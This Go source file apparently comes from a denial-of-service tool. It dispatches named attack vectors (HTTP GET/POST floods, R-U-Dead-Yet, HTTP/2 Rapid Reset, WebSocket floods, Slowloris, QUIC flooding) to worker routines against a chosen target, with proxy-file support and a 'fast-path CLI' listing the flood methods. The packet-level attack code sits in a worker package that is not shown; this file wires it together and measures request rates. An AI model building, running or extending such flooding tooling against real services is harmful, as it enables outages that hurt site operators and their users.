package vector

import (
	"context"
	"fmt"
	"time"

	"github.com/kjsst/sh-mvdos/internal/worker"
)

// Run executes a canonical vector against target until ctx is done.
func Run(ctx context.Context, spec Spec, target string, scale Scale) (RunResult, error) {
	scale = spec.FillDefaults(spec.ApplyCapabilities(scale))
	start := time.Now()

	var reqs, errs uint64
	var err error

	switch spec.Worker {
	case "l7-abuser":
		mode := string(spec.ID)
		if spec.ID == IDBaseline {
			mode = "baseline"
		}
		w := worker.L7Abuser{
			Target:    targetWithPath(target, scale.Paths),
			Workers:   scale.Workers,
			Streams:   scale.Streams,
			BatchSize: scale.Batch,
			Mode:      mode,
			ProxyFile: scale.ProxyFile,
		}
		if scale.Batch <= 0 && spec.ID == IDRUDY {
			w.BatchSize = 1
		}
		reqs, errs, err = w.Run(ctx)
	case "h2-thrasher":
		w := worker.H2RapidReset{
			Target:    target,
			Workers:   scale.Workers,
			Streams:   scale.Streams,
			BatchSize: scale.Batch,
		}
		reqs, errs, err = w.Run(ctx)
	case "ws-flood":
		wsPath := scale.WSPath
		if wsPath == "" && len(scale.Paths) > 0 {
			wsPath = scale.Paths[0]
		}
		w := worker.WSFlood{
			Target:    target,
			Workers:   scale.Workers,
			Streams:   scale.Streams,
			BatchSize: scale.Batch,
			WSPath:    wsPath,
		}
		reqs, errs, err = w.Run(ctx)
	case "slowloris":
		w := worker.Slowloris{Target: target, Workers: scale.Workers}
		reqs, errs, err = w.Run(ctx)
	case "quic-burner":
		w := worker.QUICBurner{Target: target, Workers: scale.Workers, BatchSize: scale.Batch}
		reqs, errs, err = w.Run(ctx)
	default:
		return RunResult{}, fmt.Errorf("vector: unsupported worker %q", spec.Worker)
	}

	elapsed := time.Since(start).Seconds()
	if elapsed < 0.001 {
		elapsed = 0.001
	}
	return RunResult{
		VectorID:   spec.ID,
		Protocol:   spec.Protocol,
		Attempts:   reqs,
		Errors:     errs,
		Elapsed:    elapsed,
		RPS:        float64(reqs) / elapsed,
		ActualMode: string(spec.ID),
	}, err
}

func targetWithPath(base string, paths []string) string {
	if len(paths) == 0 {
		return base
	}
	urls := BuildTargetURLs(base, paths)
	if len(urls) > 0 {
		return urls[0]
	}
	return base
}

// SlayerMethods returns vector ids exposed on the fast-path CLI.
func SlayerMethods() []ID {
	return []ID{IDHTTPGet, IDHTTPPost, IDRUDY, IDAPIFlood, IDH2RapidReset, IDWSFlood}
}